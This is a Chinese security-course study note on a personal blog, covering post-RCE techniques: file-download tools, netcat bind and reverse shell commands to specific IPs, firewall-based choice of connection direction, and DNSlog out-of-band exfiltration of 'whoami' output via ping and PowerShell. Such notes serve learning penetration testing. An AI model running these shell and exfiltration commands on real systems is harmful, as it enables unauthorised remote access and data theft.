<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    

<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>

<meta charset="utf-8" >

<title>第5天 基础入门-命令&amp;反弹&amp;外带</title>
<meta name="keywords" content="第5天 基础入门-命令&amp;反弹&amp;外带, R0seW1thH3r">
<meta name="description" content="
文件下载&amp;反弹SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站

rce后数据不回显怎么办：

反弹shell

带外查询



常规基本渗透命令详解：https://blog.csdn.net/weixi">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="shortcut icon" href="/archives/favicon.ico">
<link rel="stylesheet" href="/archives/style/main.css">


<link rel="stylesheet" href="/archives/style/jquery.fancybox.min.css">




    <link rel="stylesheet" href="/archives/style/prism.css"/>




  <meta name="generator" content="Hexo 6.1.0"></head>
  <body>
    <div id="app" class="main">

<div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://R0seW1thH3r.github.io/archives">
        <img class="avatar" src="/archives/images/avatar.png" alt="logo" width="32px" height="32px">
      </a>
      <a href="https://R0seW1thH3r.github.io/archives">
        <h1 class="site-title">R0seW1thH3r</h1>
      </a>
    </div>
    <div class="right">
        <i class="icon menu-switch icon-menu-outline" ></i>
    </div>
  </div>
</div>

<div class="menu-container" style="height: 0;opacity: 0;">
<nav class="menu-list">
  
    
      <a href="/archives/archives" class="menu purple-link">
        Index
      </a>
    
  
    
      <a href="/archives/tags" class="menu purple-link">
        Tags
      </a>
    
  
    
      <a href="/archives/about" class="menu purple-link">
        About
      </a>
    
  
</nav>
</div>



  <div class="content-container">
    <div class="post-detail">
      
      <h2 class="post-title">第5天 基础入门-命令&amp;反弹&amp;外带</h2>
      <div class="post-info post-detail-info">
        <span><i class="icon icon-calendar-outline"></i> 2023-03-03</span>
        
          <span>
          <i class="icon icon-pricetags-outline"></i>
            
              <a href="/archives/tags/V2023-1%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
              V2023-1小迪安全学习笔记
                
              </a>
            
          </span>
        
      </div>
      <div class="post-content-wrapper">
        <div class="post-content">
          <ul>
<li><strong>文件下载&amp;反弹SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站</strong></li>
</ul>
<p>rce后数据不回显怎么办：</p>
<ol>
<li><p>反弹shell</p>
</li>
<li><p>带外查询</p>
</li>
</ol>
<blockquote>
<p>常规基本渗透命令详解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p>
</blockquote>
<h2 id="用命令上传下载文件"><a href="#用命令上传下载文件" class="headerlink" title="用命令上传下载文件"></a>用命令上传下载文件</h2><p>命令生成：<a target="_blank" rel="noopener" href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
<ul>
<li><p>Linux：wget curl python ruby perl java</p>
</li>
<li><p>Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32等</p>
</li>
</ul>
<h2 id="反弹-Shell及正反向连接"><a href="#反弹-Shell及正反向连接" class="headerlink" title="反弹 Shell及正反向连接"></a>反弹 Shell及正反向连接</h2><p>命令生成：<a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>
<p>1、正向连接：我去找你</p>
<pre class="line-numbers language-none"><code class="language-none">目标机：nc -e cmd -lvp 5566			&#x2F;&#x2F;绑定CMD到本地的5566端口(win)
攻击机：ncat 47.122.23.131 5566		&#x2F;&#x2F;主动连接目标ip的5566端口(linux)

目标机：ncat -e &#x2F;bin&#x2F;sh -lvp 5566	&#x2F;&#x2F;绑定sh到本地的5566端口(linux)
攻击机：nc 47.94.236.117 5566		&#x2F;&#x2F;主动连接目标ip的5566端口(win)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>2、反向连接：你来找我</p>
<pre class="line-numbers language-none"><code class="language-none">目标机：nc -e cmd 47.94.236.117 5566			&#x2F;&#x2F;绑定CMD到目标的5566端口(win)
攻击机：ncat -lvvp 5566						&#x2F;&#x2F;等待5566连接(linux)

目标机：ncat -e &#x2F;bin&#x2F;sh 47.122.23.131 5566	&#x2F;&#x2F;绑定sh到目标的5566端口(linux)
攻击机：nc -lvvp 5566						&#x2F;&#x2F;等待5566连接(win)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>还讲了这么几种情况：</p>
<p>一、目标机 开启防火墙 的时候：</p>
<ol>
<li>开启入站策略：目标机外面的数据进不去，只能是目标机找我们，就是反向连接。</li>
<li>开启出站策略：目标机的数据出不来，那就是我们去找它，就是正向连接。</li>
</ol>
<p>二、网络：</p>
<ol>
<li>目标机和攻击机都在外网：互相可以通信，那么正向连接和反向连接都可以。</li>
<li>目标机在内网，攻击机在外网：我们找不到目标机，目标机可以找到我们，就是反向连接。</li>
<li>目标机在外网，攻击机在内网：目标机找不到我们，我们可以找到目标机，就是正向连接。</li>
<li>目标机和攻击机都在内网：使用一个处于外网的vps做frp服务器，当个中间人。（之后内网课程讲）</li>
</ol>
<h2 id="ICMP带外查询-Dnslog"><a href="#ICMP带外查询-Dnslog" class="headerlink" title="ICMP带外查询 Dnslog"></a>ICMP带外查询 Dnslog</h2><p><a target="_blank" rel="noopener" href="http://dnslog.cn/">DNSLog Platform</a></p>
<pre class="line-numbers language-none"><code class="language-none">linux: ping &#96;whoami&#96;.f4an93.dnslog.cn
Windows: powershell $x&#x3D;whoami;$x&#x3D;$x.Replace(&#39;\&#39;,&#39;xxx&#39;);$y&#x3D;&#39;.f4an93.dnslog.cn&#39;;$z&#x3D;$x+$y;ping $z<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>由于cmd无法执行<code>whoami</code>，所以用到powershell的变量赋值 把<code>whoami</code>执行结果给变量<code>x</code>；结果带有<code>\</code> 导致ping无法执行，所以用<code>xxx</code>代替<code>/</code>。</p>
<hr>

        </div>
        <div class="top-div">
          <ol class="top-box"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E7%94%A8%E5%91%BD%E4%BB%A4%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="top-box-text">用命令上传下载文件</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%8F%8D%E5%BC%B9-Shell%E5%8F%8A%E6%AD%A3%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="top-box-text">反弹 Shell及正反向连接</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#ICMP%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2-Dnslog"><span class="top-box-text">ICMP带外查询 Dnslog</span></a></li></ol>
        </div>
      </div>
    </div>

    
      <div class="next-post">
        <a class="purple-link" href="/archives/2023/02/27/%E7%AC%AC4%E5%A4%A9%20app%E5%92%8C%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91%E6%9E%B6%E6%9E%84/">
          <h3 class="post-title">
            下一篇：第4天 基础入门-app和小程序开发架构
          </h3>
        </a>
      </div>
    
  </div>




<footer>
<div class="site-footer">
  <div class="social-container">
    
      
        <a href="https://github.com/" target="_blank">
          <i class="icon icon-github"></i>
        </a>
      
    
      
        <a href="https://twitter.com/" target="_blank">
          <i class="icon icon-twitter"></i>
        </a>
      
    
      
    
      
    
      
    
  </div>
  
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
  
  
  
  
  
  
</div>
</footer>


      </div>
      
    <script src="/archives/js/jquery.min.js"></script>
    <script src="/archives/js/jquery.fancybox.min.js"></script>


<script id="hexo-configurations">
    window.theme_config = {"image":{"lazyload_enable":false}};
    window.is_post = true;
  </script>

<script src="/archives/js/main.js"></script>





    </div>
  </body>
</html>

